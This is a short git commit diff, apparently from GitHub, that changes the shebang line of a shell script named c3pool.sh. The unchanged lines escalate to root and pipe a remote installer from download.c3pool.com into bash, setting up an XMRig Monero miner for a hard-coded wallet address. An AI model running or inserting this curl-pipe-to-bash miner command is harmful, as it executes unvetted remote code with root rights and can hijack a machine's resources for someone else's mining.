900366051c4632fc308074dc09e22f4cf4ef2fb8
fafafa19001 <66203697+fafafa19001@users.noreply.github.com>
2020-09-20 11:20:53 +0800

    Update c3pool.sh

--- c3pool.sh
+++ c3pool.sh
@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/bash
 
 sudo -i
 curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43FCyiMCPc5Sx5kKURN4j1KTH5fA7C9ZAUys3VaxoBoQ7qWtV3UoUuX3BSdLNdxUMBUxYPxgUAxN6Jse5hKodvhqFej495L
